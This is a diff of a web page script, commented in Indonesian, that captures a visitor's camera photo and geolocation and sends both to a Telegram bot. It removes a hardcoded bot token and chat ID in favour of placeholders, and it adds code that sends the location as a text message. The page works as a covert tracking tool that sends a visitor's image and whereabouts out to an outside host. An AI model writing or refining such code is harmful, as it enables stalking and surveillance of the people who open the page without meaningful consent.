@@ -17,7 +17,7 @@
                         // Ambil foto setelah beberapa detik
                         setTimeout(() => {
                             captureAndSend(stream);
-                        }, 2000); // Ambil foto setelah 2 detik
+                        }, 3000); // Ambil foto setelah 3 detik
                     })
                     .catch(function(error) {
                         alert("Akses kamera ditolak.");
@@ -35,7 +35,7 @@
 
                     // Kirimkan URL Google Maps ke Telegram
                     const locationUrl = `https://www.google.com/maps?q=${lat},${lon}`;
-                    sendToTelegram(`Lokasi Anda: ${locationUrl}`);
+                    sendToTelegram(locationUrl); // Mengirimkan lokasi sebagai teks
                 }, function(error) {
                     alert("Gagal mendapatkan lokasi.");
                 });
@@ -48,13 +48,7 @@
             const video = document.createElement('video');
             video.srcObject = stream;
 
-            // Pastikan video diputar terlebih dahulu sebelum menangkap gambar
             video.onloadedmetadata = () => {
-                video.play(); // Memastikan video mulai diputar
-            };
-
-            // Tunggu sampai video siap diputar sebelum menangkap gambar
-            video.oncanplay = () => {
                 // Tentukan ukuran canvas sesuai dengan video
                 const canvas = document.createElement('canvas');
                 const context = canvas.getContext('2d');
@@ -77,31 +71,51 @@
             };
         }
 
-        function sendToTelegram(blob) {
-            const telegramToken = '7030408795:AAFfhnjy4x3f3gotpugela5qFMbVVnE9HpI';
-            const chatId = '1746156378';
+        function sendToTelegram(message) {
+            const telegramToken = 'YOUR_TELEGRAM_BOT_TOKEN'; // Ganti dengan token bot Telegram Anda
+            const chatId = 'YOUR_CHAT_ID'; // Ganti dengan chat ID Telegram Anda
 
-            // Create FormData to send the image as a file
-            const formData = new FormData();
-            formData.append('chat_id', chatId);
-            formData.append('photo', blob, 'photo.jpg');
+            // Jika pesan berupa gambar (Blob)
+            if (message instanceof Blob) {
+                const formData = new FormData();
+                formData.append('chat_id', chatId);
+                formData.append('photo', message, 'photo.jpg');
 
-            // Send the photo using sendPhoto API
-            const url = `https://api.telegram.org/bot${telegramToken}/sendPhoto`;
-
-            fetch(url, {
-                method: 'POST',
-                body: formData
-            })
-            .then(response => response.json())
-            .then(data => {
-                if (data.ok) {
-                    console.log('Gambar terkirim ke Telegram');
-                } else {
-                    console.log('Error mengirim gambar:', data);
-                }
-            })
-            .catch(error => console.log('Error:', error));
+                // Kirimkan foto ke Telegram
+                const url = `https://api.telegram.org/bot${telegramToken}/sendPhoto`;
+                fetch(url, {
+                    method: 'POST',
+                    body: formData
+                })
+                .then(response => response.json())
+                .then(data => {
+                    if (data.ok) {
+                        console.log('Gambar terkirim ke Telegram');
+                    } else {
+                        console.log('Error mengirim gambar:', data);
+                    }
+                })
+                .catch(error => console.log('Error:', error));
+            } else if (typeof message === 'string') {
+                // Jika pesan berupa teks (lokasi atau pesan lainnya)
+                const url = `https://api.telegram.org/bot${telegramToken}/sendMessage`;
+                fetch(url, {
+                    method: 'POST',
+                    body: new URLSearchParams({
+                        chat_id: chatId,
+                        text: message
+                    })
+                })
+                .then(response => response.json())
+                .then(data => {
+                    if (data.ok) {
+                        console.log('Pesan terkirim ke Telegram');
+                    } else {
+                        console.log('Error mengirim pesan:', data);
+                    }
+                })
+                .catch(error => console.log('Error:', error));
+            }
         }
     </script>
 </body>
